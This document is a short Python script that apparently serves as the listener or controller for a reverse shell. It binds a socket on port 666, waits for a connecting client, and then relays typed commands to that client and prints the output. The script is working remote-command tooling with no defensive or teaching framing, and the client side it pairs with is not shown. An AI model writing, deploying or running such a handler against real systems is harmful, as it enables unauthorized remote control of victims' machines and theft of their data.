import os
import socket
import subprocess
import sys

ip = 'IP'
port = 666

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip, port))
server.listen()
client, addr = server.accept()

while True:
    # receive path
    msg = client.recv(1000)
    # print path
    sys.stdout.write(msg.decode('utf-8') + ' ')
    sys.stdout.flush()
    # wait the command
    command = input()
    # send command
    client.send(command.encode())
    # receive result
    msg = client.recv(10000)
    # print result
    print(msg.decode('utf-8'))
